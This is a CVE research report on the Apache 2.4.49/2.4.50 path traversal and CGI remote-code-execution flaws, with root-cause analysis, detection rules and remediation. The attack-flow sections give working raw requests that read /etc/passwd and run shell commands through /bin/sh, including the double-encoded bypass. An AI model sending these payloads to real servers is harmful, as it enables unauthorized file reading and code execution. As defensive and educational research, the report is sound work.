# CVE Research Report: CVE-2021-41773 & CVE-2021-42013
## Apache HTTP Server — Path Traversal & Remote Code Execution

---

## 1. Executive Summary

| Field | Details |
|:------|:--------|
| **CVE** | CVE-2021-41773 (primary), CVE-2021-42013 (bypass of incomplete fix) |
| **Product** | Apache HTTP Server |
| **Vulnerable Versions** | 2.4.49 (CVE-2021-41773), 2.4.50 (CVE-2021-42013) |
| **Fixed Version** | 2.4.51 and later |
| **Severity** | **Critical — CVSS v3.1: 9.8** |
| **CWEs** | CWE-22 (Path Traversal), CWE-94 (Code Injection / RCE) |
| **Disclosed** | October 4–7, 2021 |
| **Exploited in the Wild** | Yes — mass scanning observed within hours of disclosure |
| **Authentication Required** | No |
| **User Interaction Required** | No |

A flaw in the URI path normalization function `ap_normalize_path()` in Apache
HTTP Server 2.4.49 allowed an unauthenticated remote attacker to escape the
configured document root via a crafted URL containing percent-encoded dot
segments. On servers with `mod_cgi` enabled and permissive directory access
controls, this escalated to unauthenticated remote code execution.

The 2.4.50 patch was incomplete. A double-encoded variant of the payload
(`%%32%65` representing `%2e` representing `.`) bypassed the single-pass
check introduced in 2.4.50, resulting in CVE-2021-42013. Both were fully
remediated in Apache 2.4.51.

---

## 2. CVSS v3.1 Vector Decomposition

**Vector string:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`

| Metric | Value | Explanation |
|:-------|:------|:------------|
| **Attack Vector (AV)** | Network (N) | Exploitable over the internet; no local access required |
| **Attack Complexity (AC)** | Low (L) | No special conditions; a single crafted HTTP request suffices |
| **Privileges Required (PR)** | None (N) | No credentials or account required |
| **User Interaction (UI)** | None (N) | Fully server-side; no victim action needed |
| **Scope (S)** | Unchanged (U) | Impact limited to the vulnerable component |
| **Confidentiality (C)** | High (H) | Arbitrary file read possible (e.g., `/etc/passwd`, private keys) |
| **Integrity (I)** | High (H) | RCE via mod_cgi allows arbitrary write/modification |
| **Availability (A)** | High (H) | RCE enables process termination, resource exhaustion |

**Base Score: 9.8 / 10 (Critical)**

---

## 3. Vulnerability Type & CWE Classification

### CWE-22: Improper Limitation of a Pathname to a Restricted Directory (Path Traversal)

The software uses external input to construct a pathname intended to identify
a file or directory within a restricted parent directory, but does not properly
neutralise special elements (encoded `../` sequences) that can resolve to a
location outside the intended directory.

**Mechanism in this CVE:**
The percent-encoded sequence `.%2e` (dot + URL-encoded dot) is decoded by
`ap_normalize_path()` into `..` (two dots = parent directory indicator) but
the resulting `..` segment is not re-evaluated for traversal. Apache then
serves the file at the resolved path, which can be outside the document root.

### CWE-94: Improper Control of Generation of Code (Code Injection → RCE)

When `mod_cgi` is loaded and `Options +ExecCGI` is active, Apache treats
requests routed through ScriptAlias paths as CGI scripts and executes them.
If the path traversal resolves a request to a system binary (e.g., `/bin/sh`),
Apache executes it, passing the HTTP request body as stdin — arbitrary code
execution without any authentication.

---

## 4. Root Cause Analysis

### 4.1 The Vulnerable Function: `ap_normalize_path()` in `server/util.c`

Apache HTTP Server uses `ap_normalize_path()` to sanitize incoming request
URI paths. Its job is to collapse sequences like `/a/b/../c` into `/a/c`.
This is essential for security: any `..` segment that escapes the document
root must be blocked.

The 2.4.49 change to this function introduced a bug in how percent-encoded
characters were handled during the normalization pass.

### 4.2 The Encoding Bug (CVE-2021-41773)

**Standard URL encoding:** `.` (dot, ASCII 0x2E) can be encoded as `%2E` or `%2e`.

**The flaw in 2.4.49's logic (simplified pseudocode):**

```c
// Pseudocode of the vulnerable normalization pass
while (reading path segments) {
    decode_percent_encoding(segment);       // %2e -> .
    // BUG: After decoding, the code does NOT re-check whether
    //      the decoded segment is now ".." (a traversal sequence).
    //      It treats the decoded result as a literal filename.
    if (segment_is_double_dot(segment)) {  // This check ran BEFORE decoding
        go_up_one_directory();
    }
}
```

**Result:** The input `.%2e` is decoded to `..` internally but the traversal
check was already evaluated (against the still-encoded `.%2e`), so the `..`
is treated as a directory name rather than a traversal indicator, and the
path resolution escapes the document root.

### 4.3 The Incomplete Fix & Bypass (CVE-2021-42013)

Apache 2.4.50 added a check for the specific pattern `%2e` to detect encoded
dots before decoding. However, this check only decoded one level of encoding.

**Double-encoding bypass:**
- `%` character can itself be URL-encoded as `%25`
- So `%2e` (dot) can be written as `%252e` (double-encoded dot)
- Or using hex: `%%32%65` where `%32` = ASCII '2' and `%65` = ASCII 'e'
  → `%%32%65` → `%2e` → `.`

The 2.4.50 single-pass check found no `%2e` literal in `%%32%65` and passed
it through, where it was later decoded twice to produce `..`.

**2.4.51 fix:** Implemented a recursive/complete normalisation that decodes
all percent-encoding levels before performing traversal checks, and added
stricter validation of path segment content after each decoding pass.

### 4.4 Prerequisite: Permissive Directory Configuration

The path traversal alone allows an attacker to *request* any file path. Whether
Apache *serves* that file depends on directory access controls.

**Vulnerable configuration (the misconfiguration that enables exploitation):**

```apache
# THIS IS THE DANGEROUS SETTING — default Apache is "Require all denied"
<Directory />
    Require all granted
</Directory>
```

In a default Apache install, `<Directory />` denies all access. A traversal
request to `/etc/passwd` would still return 403 because the resolved path
`/etc/passwd` falls under the denied root directory.

The vulnerability was exploitable in practice because many custom hosting
configurations, cPanel setups, and legacy vhost deployments set permissive
directory policies — particularly when operators set `Require all granted`
as a quick fix for unrelated access problems.

---

## 5. Attack Flow & Request Analysis

### 5.1 Path Traversal (File Read) — CVE-2021-41773

```
Attack Flow:
============

  Attacker                            Apache 2.4.49
     |                                     |
     |-- GET /icons/.%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1 -->|
     |                                     |
     |                         [ap_normalize_path() called]
     |                         Input:  /icons/.%2e/%2e%2e/%2e%2e/etc/passwd
     |                         Step 1: Decode .%2e -> ..
     |                                 (%2e decoded, but traversal re-check skipped)
     |                         Step 2: Decode %2e%2e -> ..
     |                         After:  /icons/../../../etc/passwd
     |                         Normalised: /etc/passwd
     |                                     |
     |                         [Directory ACL check against /etc/passwd]
     |                         <Directory /> Require all granted → PASS
     |                                     |
     |<-- HTTP 200 OK + content of /etc/passwd ----|
     |
```

**Raw request:**
```http
GET /icons/.%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1
Host: target:8080
User-Agent: curl/7.79.1
```

**Expected response on vulnerable server (200 OK):**
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

**Expected response on patched server (400 Bad Request):**
```http
HTTP/1.1 400 Bad Request
```

### 5.2 CGI Handler Routing (RCE) — CVE-2021-41773

```
Attack Flow:
============

  Attacker                            Apache 2.4.49 + mod_cgi
     |                                     |
     |-- POST /cgi-bin/.%2e/.%2e/.%2e/bin/sh HTTP/1.1 -->|
     |   Body: echo; id                    |
     |                                     |
     |                         [ap_normalize_path() called]
     |                         Input:  /cgi-bin/.%2e/.%2e/.%2e/bin/sh
     |                         Normalised: /bin/sh
     |                                     |
     |                         [ScriptAlias /cgi-bin/ matched by prefix]
     |                         [mod_cgi: /bin/sh is a CGI script → execute it]
     |                         [POST body piped to /bin/sh stdin]
     |                         /bin/sh executes: echo; id
     |                         "echo" outputs blank line (CGI header separator)
     |                         "id" outputs: uid=1(daemon) gid=1(daemon) ...
     |                                     |
     |<-- HTTP 200 OK + command output ----|
```

**Raw request:**
```http
POST /cgi-bin/.%2e/.%2e/.%2e/bin/sh HTTP/1.1
Host: target:8080
Content-Type: application/x-www-form-urlencoded
Content-Length: 9

echo; id
```

**Expected response on vulnerable server (200 OK):**
```
uid=1(daemon) gid=1(daemon) groups=1(daemon)
```

### 5.3 CVE-2021-42013 Double-Encoding Bypass

The 2.4.50 payload uses double-encoded dot segments:

```http
GET /icons/.%%32%65/.%%32%65/.%%32%65/etc/passwd HTTP/1.1
```

Decoding chain:
- `.%%32%65` → `.%2e` (first pass: `%32`=`2`, `%65`=`e`) → `..` (second pass)
- Each traversal segment resolves to `..` after two decode passes
- 2.4.50 only checked for `%2e` literally, missed the double-encoded variant

---

## 6. Affected Components

| Component | Role in Vulnerability |
|:----------|:---------------------|
| `server/util.c` → `ap_normalize_path()` | Core vulnerability: decodes `%2e` without re-checking traversal |
| `modules/mappers/mod_alias.c` → `ScriptAlias` | Routes matched URL prefix to CGI handler |
| `modules/generators/mod_cgi.c` | Executes resolved filesystem path as a CGI script |
| `httpd.conf` → `<Directory />` | Access control configuration — permissive setting enables exploitation |

---

## 7. Differential Analysis: CVE-2021-41773 vs CVE-2021-42013

| Dimension | CVE-2021-41773 (2.4.49) | CVE-2021-42013 (2.4.50) |
|:----------|:------------------------|:------------------------|
| **Root version** | 2.4.49 | 2.4.50 (incomplete fix) |
| **Encoding** | Single: `.%2e` | Double: `.%%32%65` or `.%252e` |
| **Why 2.4.50 is still vulnerable** | Fix only scanned for literal `%2e`; double-encoding bypasses this |
| **Traversal segments needed** | 3–4 `../` equivalents | 3–4 double-encoded `../` equivalents |
| **CGI vector affected?** | Yes | Yes |
| **Fixed in** | 2.4.51 | 2.4.51 |

---

## 8. Detection Methods

### 8.1 Version Banner Check

Inspect the `Server:` HTTP response header:
```
Server: Apache/2.4.49 (Unix)   → VULNERABLE
Server: Apache/2.4.50 (Unix)   → VULNERABLE
Server: Apache/2.4.51 (Unix)   → Patched
```

Note: `ServerTokens Prod` suppresses the version; version check alone is
insufficient. Always combine with an active probe.

### 8.2 Active Probe (Non-Destructive)

Send a traversal request targeting a known-benign file (`/etc/issue`):

```bash
curl -s --path-as-is "http://target/icons/.%2e/%2e%2e/etc/issue"
```

- HTTP 200 with content → VULNERABLE
- HTTP 400 → PATCHED (2.4.51 rejects malformed encoded paths)
- HTTP 403 → Directory ACL active (possibly patched or directory-hardened)

### 8.3 Apache Access Log Indicators of Compromise (IOCs)

Look for these patterns in Apache `access.log`:

```
# Path traversal attempts (single-encoded):
GET /icons/.%2e/%2e%2e/%2e%2e/etc/passwd

# Path traversal attempts (double-encoded):
GET /icons/.%%32%65/.%%32%65/etc/passwd

# CGI RCE attempt patterns:
POST /cgi-bin/.%2e/.%2e/.%2e/bin/sh
POST /cgi-bin/.%%32%65/.%%32%65/.%%32%65/bin/sh
```

### 8.4 IDS/IPS Signatures

**Suricata rule (example):**
```
alert http any any -> $HTTP_SERVERS any (
    msg:"CVE-2021-41773 Apache Path Traversal Attempt";
    flow:established,to_server;
    content:".%2e"; http_uri; nocase;
    pcre:"/\/(icons|cgi-bin)\/.*\.%2e/i";
    classtype:web-application-attack;
    sid:9000001; rev:1;
)
```

**Nginx / WAF regex pattern:**
```regex
(?i)(?:\.%2e|%2e\.|\.\.|%252e|%%32%65)[\/\\]
```

---

## 9. Remediation

### Immediate Action

**Upgrade Apache HTTP Server to 2.4.51 or higher.**

```bash
# Debian / Ubuntu
sudo apt update && sudo apt install apache2

# RHEL / CentOS / Rocky
sudo yum update httpd

# Verify version
apache2 -v          # or
httpd -v
```

### Defence-in-Depth (Configuration Hardening)

Even on patched versions, apply these settings:

```apache
# 1. Deny all access by default — only explicitly allow what is needed
<Directory />
    Require all denied
    Options None
    AllowOverride None
</Directory>

# 2. Suppress version information from response headers
ServerTokens Prod
ServerSignature Off

# 3. Disable mod_cgi if CGI scripts are not required
# Comment out or remove:
# LoadModule cgi_module modules/mod_cgi.so
# LoadModule cgid_module modules/mod_cgid.so

# 4. Restrict ScriptAlias directories explicitly
<Directory "/var/www/cgi-bin">
    Options None
    AllowOverride None
    Require all denied   # Only grant if CGI is genuinely needed
</Directory>
```

---

## 10. Public Advisories & References

| Reference | URL / Source |
|:----------|:------------|
| **Apache Security Advisory** | https://httpd.apache.org/security/vulnerabilities_24.html |
| **NVD — CVE-2021-41773** | https://nvd.nist.gov/vuln/detail/CVE-2021-41773 |
| **NVD — CVE-2021-42013** | https://nvd.nist.gov/vuln/detail/CVE-2021-42013 |
| **CISA Advisory AA21-281A** | https://www.cisa.gov/news-events/cybersecurity-advisories/aa21-281a |
| **Apache httpd GitHub** | https://github.com/apache/httpd |
| **CVE.org** | https://www.cve.org/CVERecord?id=CVE-2021-41773 |
| **Qualys Blog — Technical Analysis** | https://blog.qualys.com/vulnerabilities-threat-research/2021/10/27/apache-http-server-path-traversal-remote-code-execution |
| **Huntress Labs Analysis** | https://www.huntress.com/blog/rapid-response-critical-apache-http-server-vulnerability |

---

## 11. Lab Assumptions & Limitations

| Item | Detail |
|:-----|:-------|
| **Configuration** | The lab httpd.conf uses `Require all granted` on `<Directory />`. In a default Apache install, traversal to `/etc/passwd` would return 403. The permissive setting reflects real-world misconfigurations, not a default install. |
| **CGI binary** | The CGI vector uses `/bin/sh` as the executed binary. Container images use `busybox` sh in Alpine, which supports the echo trick. |
| **Network isolation** | Containers bind to `127.0.0.1` only. The lab is not accessible from any external network. |
| **Windows curl** | Windows `curl.exe` (system) normalises URLs. Use `--path-as-is` flag or the Python scripts instead. |
| **httpd:2.4.49** | Docker Hub's official `httpd:2.4.49` image is the actual vulnerable binary. No source compilation is required. |
